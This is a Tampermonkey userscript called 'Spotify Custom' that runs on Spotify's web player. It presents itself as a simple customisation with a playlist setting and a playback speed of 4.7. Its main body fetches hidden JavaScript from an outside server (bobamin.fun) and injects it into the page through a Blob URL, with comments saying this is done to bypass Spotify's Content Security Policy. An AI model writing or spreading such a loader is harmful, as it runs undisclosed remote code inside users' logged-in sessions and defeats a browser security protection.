// ==UserScript==
// @name         Spotify Custom
// @namespace    http://tampermonkey.net/
// @version      2
// @description  Spotify 
// @author       parkie
// @license      JMB
// @match        https://open.spotify.com/*
// @grant        none
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/543211/Spotify%20Custom.user.js
// @updateURL https://update.greasyfork.org/scripts/543211/Spotify%20Custom.meta.js
// ==/UserScript==

(function() {
  'use strict';

  // === Users can ONLY change these values ===
  const PLAYLIST_URL = 'https://open.spotify.com/playlist/3xCPXFgupdbD5GWE6ovIJk';
  const PLAYBACK_SPEED = 4.7;

  // Pass config to your core script
  window.__SPOTIFY_CONFIG__ = {
    playlist: PLAYLIST_URL,
    speed: PLAYBACK_SPEED
  };

  // Fetch the protected script through loader.php (bypasses CSP with Blob)
  fetch('https://bobamin.fun/private/loader.php?token=HiddenToken456', {
    headers: { 'X-Requested-With': 'XMLHttpRequest' }
  })
    .then(res => {
      if (!res.ok) throw new Error('Failed to fetch core script');
      return res.text();
    })
    .then(code => {
      // Use a Blob to bypass Spotify CSP
      const blob = new Blob([code], { type: 'application/javascript' });
      const url = URL.createObjectURL(blob);

      const script = document.createElement('script');
      script.src = url;
      document.documentElement.appendChild(script);
    })
    .catch(err => console.error('Failed to load core script:', err));
})();
